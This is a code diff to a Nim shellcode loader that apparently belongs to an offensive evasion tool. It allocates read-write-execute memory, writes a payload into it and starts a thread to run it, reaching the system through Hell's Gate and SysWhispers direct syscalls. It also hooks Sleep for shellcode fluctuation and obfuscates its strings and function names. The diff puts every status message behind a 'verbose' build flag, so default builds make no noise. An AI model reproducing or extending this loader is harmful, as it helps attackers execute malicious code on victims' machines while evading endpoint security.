@@ -15,9 +15,11 @@ proc pwndemHellsGateLike[byte](friendlycode: openarray[byte]): void =
         g_fluctuationData.protect = PAGE_READWRITE
         g_fluctuate = FluctuateToRW
         if (hookSleep()):
-            echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
+            when defined(verbose):
+                echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
         else:
-            echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")
+            when defined(verbose):
+                echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")
 
     when defined(amd64):
 
@@ -66,7 +68,8 @@ proc pwndemHellsGateLike[byte](friendlycode: openarray[byte]): void =
             if getSyscall(ntAllocTable):
                 syscall = ntAllocTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
         
         when defined(SysWhispers):
             status = oqiahsjynmxkla(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
@@ -75,9 +78,11 @@ proc pwndemHellsGateLike[byte](friendlycode: openarray[byte]): void =
 
         
         if not NT_SUCCESS(status):
-            echo obf("[-] Failed to allocate memory.")
+            when defined(verbose):
+                echo obf("[-] Failed to allocate memory.")
         else:
-            echo obf("[+] Allocated a page of memory with RWX perms")
+            when defined(verbose):
+                echo obf("[+] Allocated a page of memory with RWX perms")
         
         var bytesWritten: SIZE_T
         when defined(Hellsgate):
@@ -89,7 +94,8 @@ proc pwndemHellsGateLike[byte](friendlycode: openarray[byte]): void =
 
                 syscall = ntWriteTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
         
         when defined(SysWhispers):
             status = oqiazasusjk(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)
@@ -97,9 +103,11 @@ proc pwndemHellsGateLike[byte](friendlycode: openarray[byte]): void =
             status = NtWriteVirtualMemory(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)
 
         if not NT_SUCCESS(status):
-            echo obf("[-] Failed to write memory.")
+            when defined(verbose):
+                echo obf("[-] Failed to write memory.")
         else:
-            echo obf("[+] NtWriteVirtualMemory - wrote bytes ") & fmt"{bytesWritten}"
+            when defined(verbose):
+                echo obf("[+] NtWriteVirtualMemory - wrote bytes ") & fmt"{bytesWritten}"
                 
         when defined(LocalCreateThread):
             var tHandle: HANDLE
@@ -108,13 +116,15 @@ proc pwndemHellsGateLike[byte](friendlycode: openarray[byte]): void =
                 NtWaitForSingleObject(tHandle, 0, nil)
                 status = zuatzuastdiasyy(tHandle)
                 status = zuatzuastdiasyy(pHandle)
-                echo obf("[*] NtCreateThreadEx: "), toHex(status)
+                when defined(verbose):
+                    echo obf("[*] NtCreateThreadEx: "), toHex(status)
             else:    
                 when defined(Hellsgate):
                     if getSyscall(ntCreateTable):
                         syscall = ntCreateTable.wSysCall
                     else:
-                        echo obf("[-] Failed to find opcode for NtCreateThreadEx")
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtCreateThreadEx")
                 status = NtCreateThreadEx(
                 &tHandle, 
                 THREAD_ALL_ACCESS, 
@@ -122,14 +132,19 @@ proc pwndemHellsGateLike[byte](friendlycode: openarray[byte]): void =
                 -1,
                 buffer, 
                 nil, FALSE, 0, 0, 0, nil)
-                echo obf("[*] NtCreateThreadEx: "), toHex(status)
-                NtWaitForSingleObject(tHandle, 0, nil)
+                when defined(verbose):
+                    echo obf("[*] NtCreateThreadEx: "), toHex(status)
+                # Somehow not working
+                #var TimeOut: LARGE_INTEGER = cast[LARGE_INTEGER](-1)
+                #NtWaitForSingleObject(-1, 0, &TimeOut)
+                WaitForSingleObject(-1, -1)
             when defined(Hellsgate):
                 when defined(Hellsgate):
                     if getSyscall(ntCloseTable):
                         syscall = ntCloseTable.wSysCall
                     else:
-                        echo obf("[-] Failed to find opcode for NtClose")
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtClose")
             status = NtClose(tHandle)
             status = NtClose(pHandle)
         else:
